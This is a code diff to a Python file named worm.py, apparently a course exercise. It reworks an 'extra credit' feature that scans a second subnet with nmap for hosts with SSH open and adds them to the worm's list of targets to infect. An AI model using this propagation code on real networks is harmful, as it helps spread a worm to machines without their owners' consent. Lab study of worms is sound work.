@@ -227,14 +227,6 @@ def getHostsOnTheSameNetwork():
 
     portScanner.scan('10.0.0.0/24', arguments='-p 22 --open') # Scan the network for systems with an open port 22
 
-    """ EXTRA CREDIT 2: Multi Spread """
-    # If user includes '-m' or '--multi' in the command when running worm.py,
-    # then the program will spread the worm infection to hosts on the network
-    # by scanning for hosts on the network '10.0.1.0/24' and adding the host
-    # info to the list of live hosts alongside the ones in the network '10.0.0.0/24'
-    if  "-m" in sys.argv or "--multi" in sys.argv:
-        portScanner.scan('10.0.1.0/24', arguments='-p 22 --open')
-
     hostData = portScanner.all_hosts()     # Scan the network for a host and assign the value to hostData
     
     liveHosts = [] # The list of hosts that are live
@@ -246,6 +238,20 @@ def getHostsOnTheSameNetwork():
         # If condition: Add to liveHost list if the host is ip
         if portScanner[host].state() == "up":
             liveHosts.append(host)
+
+    """ EXTRA CREDIT 2: Multi Spread """
+    # If user includes '-m' or '--multi' in the command when running worm.py,
+    # then the program will spread the worm infection to hosts on the network
+    # by scanning for hosts on the network '10.0.1.0/24' and adding the host
+    # info to the list of live hosts alongside the ones in the network '10.0.0.0/24'
+    if  "-m" in sys.argv or "--multi" in sys.argv:
+        multiPortScanner = nmap.PortScanner()
+        multiPortScanner.scan('10.0.1.0/24', arguments='-p 22 --open')
+        multiData = multiPortScanner.all_hosts()
+
+        for multiHost in multiData:
+            if multiPortScanner[multiHost].state() == "up":
+                liveHosts.append(multiHost)
     
     return liveHosts # Return the list of live hosts
     # pass
